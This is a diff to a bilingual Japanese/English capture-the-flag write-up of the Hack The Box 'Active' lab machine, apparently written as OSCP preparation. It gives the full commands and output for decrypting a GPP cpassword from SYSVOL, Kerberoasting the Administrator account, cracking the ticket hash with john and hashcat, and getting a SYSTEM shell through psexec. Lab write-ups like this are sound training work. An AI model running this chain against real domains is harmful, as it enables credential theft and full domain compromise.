@@ -285,7 +285,7 @@ smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Prefere
 		5217023 blocks of size 4096. 278455 blocks available
 ```
 
-この`Groups.xml`をもっと調べるためにダウンロードしていきます。
+とりあえず、この`Groups.xml`をもっと調べるためにダウンロードしていきます。
 
 <p class="english">Downloading the file `Groups.xml` to local machine with the below commands.</p>
 
@@ -294,28 +294,47 @@ prompt off
 mget Groups.xml
 ```
 
-#### Group Policy Preference (GPP)
+## TA0006: Credential Access
+### T1552.006: Group Policy Preferences (GPP)
 
-Group Policy Preferences (GPP) are extensions of Group Policy in Windows environments introduced with Windows Server 2008. They allow administrators to configure various system settings, such as scheduled tasks, services, and local users, across a domain. GPP simplifies management by letting administrators deploy settings using a GUI rather than scripts.
+Group Policy PreferenceとはWindows Server 2008で導入されたもので、Windows環境のGroup Policyの拡張機能です。GPPを使用すると管理者はドメイン全体でスケジュールされたタスク、サービス、ローカルユーザーなど、さまざまなシステム設定をコンフィグできます。GPPは、スクリプトではなくGUIを使用して設定をコンフィグできるように簡単にしてくれます。
+
+<p class="english">Group Policy Preferences (GPP) are extensions of Group Policy in Windows environments introduced with Windows Server 2008. They allow administrators to configure various system settings, such as scheduled tasks, services, and local users, across a domain. GPP simplifies management by letting administrators deploy settings using a GUI rather than scripts.</p>
 
 #### CVE-2014-1812 (Group Policy Preferences Password Elevation of Privilege Vulnerability)
 
-The GPP vulnerability arises because it allows administrators to store credentials in Group Policy settings. These credentials are stored in `SYSVOL`, a shared directory that is accessible to all authenticated domain users.
+GPPの脆弱性は、管理者がグループポリシー設定内に認証情報を保存できることに起因します。これらの認証情報は、すべてのAuthenticatedドメインユーザーがアクセス可能なShareディレクトリであるSYSVOLに保存されます。
 
-The main issue is that these credentials are:
-1. Stored in `xml` files.
-2. Encrypted using AES-256 with a [32-bit key](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) (which is made pubicly available by Microsoft).
+<p class="english">The GPP vulnerability arises because it allows administrators to store credentials in Group Policy settings. These credentials are stored in `SYSVOL`, a shared directory that is accessible to all authenticated domain users.</p>
+
+ここで問題何かと聞くと、これらの認証情報が:
+1. `xml`ファイルで保存されていることと、
+2. この[32-bit key](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)を使用したAES-256でEncryptionされていることです。あの[32-bit key](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)はMicrosoftのウェブサイトで誰でも見えるようにされています。
+
+<p class="english">The main issue is that these credentials are:</p>
+<ol class="english">
+    <li>Stored in `xml` files.</li>
+	<li>Encrypted using AES-256 with a [32-bit key](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) (which is made pubicly available by Microsoft).</li>
+</ol>
 
 #### Groups.xml
-There are two fields that we should note. `name` and `password`. The name field is in the format of `DOMAIN\USERNAME`.
+
+注目すべき2つのフィールドは`name`と`cpassword`です。nameフィールドは、`DOMAIN\USERNAME`の形になっています。
+
+<p class="english">There are two fields that we should note. `name` and `cpassword`. The name field is in the format of `DOMAIN\USERNAME`.</p>
 
 ![Groups_xml](/assets/img/posts/htb-active/ss1.png){: .center }
 _Contents of Groups.xml_
 
-The password in the `cpassword` field is the AES encrypted password for the account `SVC_TGS`.
-#### Decrypting the GPP Password
+`cpassword`フィールドにあるのは`SVC_TGS`というユーザーのAES Encryptionされているパスワードです。
 
-There is a simple ruby program that uses the publicly disclosed key to decrypt the encrypted password. It is called as `gpp-decrypt`, which is defaulty installed in Kali linux.
+<p class="english">The password in the `cpassword` field is the AES encrypted password for the account `SVC_TGS`.</p>
+
+#### GPPパスワードをDecryptionします <span class="english">(Decrypting the GPP Password)</span>
+
+誰でも見えるようにされているkeyを使ってencryptionされているパスワードをdecryptionしてくれる簡単なrubyのプログラムがあります。`gpp-decrypt`というこのプログラムはKali Linuxにはデフォルトでインストールされています。
+
+<p class="english">There is a simple ruby program that uses the publicly disclosed key to decrypt the encrypted password. It is called as `gpp-decrypt`, which is defaultly installed in Kali linux.</p>
 
 ```bash
 0hmsec@kali:-$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
@@ -324,7 +343,10 @@ GPPstillStandingStrong2k18
 
 ### Users share
 
-With the credential for a domain user, we can now have READ access to `3` shares.
+今ドメインユーザーの人であるSVC_TGSの認証情報があるから`smbmap`を実行すると3つのShareが`READ ONLY`になっていることをわかります。
+
+<p class="english">With the credential for a domain user, we can now have READ access to `3` shares.</p>
+
 
 ```bash
 0hmsec@kali:-$ smbmap -H 10.10.10.100 -u svc_tgs -p GPPstillStandingStrong2k18
@@ -345,7 +367,9 @@ With the credential for a domain user, we can now have READ access to `3` shares
 [*] Closed 1 connections 
 ```
 
-Enumerating the `Users` share is enough for you to get the `user.txt` flag. But if you are attempting for the OSCP exam, we need atleast a fully established reverse shell. So, in the exam you should make sure you obtain a root/administrator shell.
+`user.txt`フラッグを見つけるためだけだったらUsers shareを調べることが十分です。でもOSCP+試験を受ける方なら`reverse shell`で繋がってから見つけて証明するのは必要なことです。だから試験のときはそれを忘れないでくださいね。
+
+<p class="english">Looking around in the `Users` share is enough for you to get the `user.txt` flag. But if you are attempting for the OSCP exam, we need atleast a fully established reverse shell. So, in the exam you should make sure you obtain a root/administrator shell.</p>
 
 ```bash
 0hmsec@kali:-$ smbclient -N //10.10.10.100/Users -U svc_tgs --password=GPPstillStandingStrong2k18
@@ -363,7 +387,9 @@ smb: \SVC_TGS\Desktop\> exit
 
 #### USER flag
 
-Thus, we have found our `user.txt` flag.
+とうとうuser.txtフラッグを見つかりましたね。万歳!おめでとうー
+
+<p class="english">Thus, we have found our `user.txt` flag.</p>
 
 ```bash
 0hmsec@kali:-$ cat user.txt
@@ -372,15 +398,19 @@ aadec6e480a................
 
 ---
 
-## Privilege Escalation
+## TA0004: Privilege Escalation
 
-### Kerberoasting
+### T1558.003: Kerberoasting
 
-### Getting NTLM Hash
+KerberosのポートであるTCPの88が開いているから、クラック可能なTGS (Ticket-granting Service) Ticketを見つけられる可能性があります。有効なKerberos TGT (Ticket-granting Ticket)を持つユーぜーの認証情報を知っている場合は、そのユーザーに与えている任意のSPN (Service Principal Name)に対して、ドメインコントローラーから1つ以上のTGS Ticketを要求することができます。
 
-Since we have TCP port-88 (Kerberos) open, we can consider there might be a possibility of finding a crackable TGS.
+<p class="english">Since we have TCP port-88 (Kerberos) open, we can consider there might be a possibility of finding a crackable TGS. If you compromise a user that has a valid Kerberos ticket-granting ticket (TGT), then you can request one or more ticket-granting service (TGS) service tickets for any Service Principal Name (SPN) that has been assigned to that user from a domain controller.</p>
 
-The `impacket-GetUserSPNs` will help us to find any Service name associated with a normal account.
+#### NTLM Hashを取得 <span class="english">(Getting NTLM Hash)</span>
+
+`impacket-GetUserSPNs`というツールが認証情報を知っているユーザーになにかSPNが与えられているか、与えている場合はTGSを要求してくれます。
+
+<p class="english">The `impacket-GetUserSPNs` will help us to find any Service name associated with a normal account and also get the TGS if there is a service name present.</p>
 
 ```bash
 0hmsec@kali:-$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18
@@ -394,14 +424,21 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
 [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
 
-As you can see from the output that the user `Administrator` has a service name associated with it `active/CIFS:445`. So, we will surely be finding a crackable TGS. But if you look at the above output, we have got an error - `KRB_AP_ERR_SKEW(Clock skew too great)`.
+結果を見ると`Administrator`ユーぜーにSPNの`active/CIFS:445`が与えられていることがわかります。だからこそTGSを要求することができます。でも、`KRB_AP_ERR_SKEW(Clock skew too great)`というエラーができました。
 
-For Kerberoasting to work, the time difference between the Attacker machine (in my case KALI machine) and the target machine should not be more than `5 minutes`. So, for our attack to work, we need to synchronize our Kali machine's clock with that of the target machine. They can be achieved in a few different ways.
-1. `rdate`
-2. `ntpdate`
-3. `faketime`
+<p class="english">As you can see from the output that the user `Administrator` has a service name associated with it `active/CIFS:445`. So, we will surely be finding a TGS. But if you look at the above output, we have got an error - `KRB_AP_ERR_SKEW(Clock skew too great)`.</p>
 
-I will be demonstrating `rdate` here.
+Kerberoastingを成功させるには、攻撃者のマシン（この場合はKaliマシン）とターゲットマシンの時刻の差が5分を超えてはいけません。そのため、Kaliマシンの時計をターゲットマシンの時計と同期させる必要があります。これを実現する方法はいくつかあります。
+
+<p class="english">For Kerberoasting to work, the time difference between the Attacker machine (in my case KALI machine) and the target machine should not be more than `5 minutes`. So, for our attack to work, we need to synchronize our Kali machine's clock with that of the target machine. They can be achieved in a few different ways.</p>
+
+1. rdate
+2. ntpdate
+3. faketime
+
+私は`rdate`というツールを紹介します。
+
+<p class="english">I will be demonstrating `rdate` here.</p>
 
 ```bash
 0hmsec@kali:-$ sudo rdate -n 10.10.10.100
@@ -409,7 +446,9 @@ I will be demonstrating `rdate` here.
 Tue Jan 14 00:13:07 IST 2025
 ```
 
-Now, we try Kerberoasting again.
+それで時計が同期されましたからまたKerberoastingをやります。
+
+<p class="english">Since the clocks are synchronized, we do Kerberoasting again.</p>
 
 ```bash
 0hmsec@kali:-$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18
@@ -425,21 +464,28 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
 $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8df96b1773ac3225f8bea5010fbb431c$4057163268776904429252c08f25d8992de43bf8bb0facb13fc01f1b2db5983f6a47b26e8e754e880944100f29d8f08bbff8dfd79ee5fa51f4702044feaf3da6f3e0470c89e6b9e88b16f5b577e7f126f8b6dc281a88ffd103db1ba1c6e3e00586e03b6e7db24b2b83e2d5ec6e1a48f4ed3ad3cd4ded23d1fd99b97e350f87677498a7a8e2e3c62de6d006147b65cb901bf63a4d92010fed379bdc6a62ee17f0b3f8126caa8d4365659274396c44f1de4ffaa0013b90f8a1cf42558d40763e5f9b1c09b545662020a26f45df1ecca84bc5231df085fc6b6a3f232601f70416d87d148cb3669b8240ff467ef45a6fc75ccbad56e2ef706c2c2a0db3a0efefc47e3c3df45c0eab41153486bf8c3513f325cf6df4916dd6b683335fd7bb78b81116bb509de6c8eb68a79e45ac5a9806e8922d922a6903ea8c666ed0ced5c6924aefe3c4ec995418a714ac95da8a06ecb49f32cc7f1a9f18af3bcb5d3a8ba9d5fd27e640e616fe385856f524d266c23da3c0574728440a6f46b20af8322d7d65f2edf2ba2daf6a267bce738d977e6b9a7632d5093538a87fdd360adb7a8fc3ae803ce1091cf58d9b805dc50abaac735d9ccc81116e7998890b6da44e14dcb0378bd5b2365870a297469ee44eba0657a853d328ea92e7a58c055a568cd41ff4c165342e1cf703a8619983a5e5ee966566323e1e489c67c27c5646c99215a4fcee291d84032f15a67d37c2367d4707fd0775e3cd09bb448679ed48747fad1df0ebe744d5087f6ae2481641a103a45346fa7d6c14f1ece4833f7ba43c14c6e347ca50e1d15b6d31b69b5733418b4110fe0fb503c5e35978ee823d2b2da0681b50f5fee0febe6edb9a61379f50ceeb6148a69aa9066d28815f9e9a2e2e3c466a7f5b2e437786c3acaeb6a09040b6c88b4f597c1d2732f654643bbf94072855da5d5bea639db1b56b17c8d7340760111ddbf30876984c8cb594d59dfa2cee8e1377f0a27e98e605ad7f00c435d37d30c1ab46877accc05fd8f11c8257e238647e957ddb6120339534802b2eee9db4823c7f5ad5d09e108a85d4d220dc2158bf3504c749ecf2bcdcbaf363184cad6b24a29ee8cde9fb5b695e5a2d66e22f36249ffb02b4c4400a8fb5413c3c0b20c95b7f31c9ec9fa0b3d4f8894ad3a42ad49b7c0dec50aa3500e8bf7037872b933f0cad3cc57513c977c5f4c7ba6abf6b278781714c31a6c260e5680623643ea8358114b1ddc886ed2163b0dc6e15c0abeb
 ```
 
-If you want the TGS to be stored in a file directly, then use the below command.
+TGSを自動で新しいファイルに保存したかったら、以下のコマンドを利用してください。
+
+<p class="english">If you want the TGS to be stored in a file directly, then use the below command.</p>
 
 ```bash
 0hmsec@kali:-$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18 -save -outputfile admin.kerberos
 ```
 
-### Cracking the NTLM Hash
+#### NTLM Hashをクラックいたします <span class="english">(Cracking the NTLM Hash)</span>
 
-First, save the hash to a file. I saved it as `admin.kerberos`.
+まずは得ったHashをファイルに保存してください。私は`admin.kerberos`というファイルで保存しました。
 
-Next, I will demonstrate using the two most popular password cracking tool.
+<p class="english">First, save the hash to a file. I saved it as `admin.kerberos`.</p>
+
+それで人気である２つのパスワードクラックツールを紹介します。
+
+<p class="english">Next, I will demonstrate using the two most popular password cracking tool:</p>
+
 1. `johntheripper`
 2. `hashcat`
 
-#### 1. johntheripper
+##### 1. johntheripper
 
 ```bash
 0hmsec@kali:-$ john admin.kerberos --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs
@@ -453,9 +499,11 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-#### 2. hashcat
+##### 2. hashcat
 
-We need to know the mode for cracking the Kerberos TGS-REP.
+`hashcat`利用する場合は、hashcatのKerberos TGS-REPのモードを知る必要があります。
+
+<p class="english">We need to know the mode for cracking the Kerberos TGS-REP.</p>
 
 ```bash
 0hmsec@kali:-$ hashcat -h | grep -i kerberos
@@ -470,7 +518,9 @@ We need to know the mode for cracking the Kerberos TGS-REP.
   18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
 ```
 
-The mode we should use is `13100`.
+利用するモードは`13100`です。
+
+<p class="english">The mode we should use is `13100`.</p>
 
 ```bash
 0hmsec@kali:-$ hashcat -m 13100 admin.kerberos  /usr/share/wordlists/rockyou.txt
@@ -479,9 +529,13 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e51a53ed5d023dd0
 ---[snip]---
 ```
 
+見つけたパスワードは`Ticketmaster1968`です。
+
 ### Shell as ADMINISTRATOR
 
-Now, all the SMB shares are writable with the `Administrator` access. Therefore, it is now easy to get a shell using `impacket-psexec`.
+今は`impacket-psexec`を利用して、`Administrator`としてShellを取得するのは簡単になります。
+
+<p class="english">It is now easy to get a shell as administrator using `impacket-psexec`.</p>
 
 ```bash
 0hmsec@kali:-$ impacket-psexec administrator:Ticketmaster1968@10.10.10.100
@@ -503,9 +557,12 @@ nt authority\system
 
 #### ROOT flag
 
-Thus, we have the `root.txt` flag.
+とうとうroot.txtフラッグも見つかりましたね。万歳!万歳!万歳!
 
->If you are preparing for OSCP, always make sure to get your screenshots that displays the output of the commands `type root.txt`, `hostname` and `ipconfig`. Your screenshot should contain all the contents as shown below. In the OSCP exam boxes, the "root.txt" will be "proof.txt".
+<p class="english">Thus, we have the `root.txt` flag.</p>
+
+>もしOSCP+試験を受ける方なら、フラッグ見つかった証明スクショを撮るときには`type root.txt`、`whoami`と`ipconfig`、この3つのコマンドの結果が写っていなければなりません。以下の例みたいに撮ってください。OSCP+試験には"root.txt"は"proof.txt"になりますから気をつけてくださいね。
+>>If you are preparing for OSCP+, always make sure to get your screenshots that displays the output of the commands `type root.txt`, `whoami` and `ipconfig`. Your screenshot should contain all the contents as shown below. In the OSCP+ exam boxes, the "root.txt" will be "proof.txt".
 {: .prompt-tip }
 
 ```bash
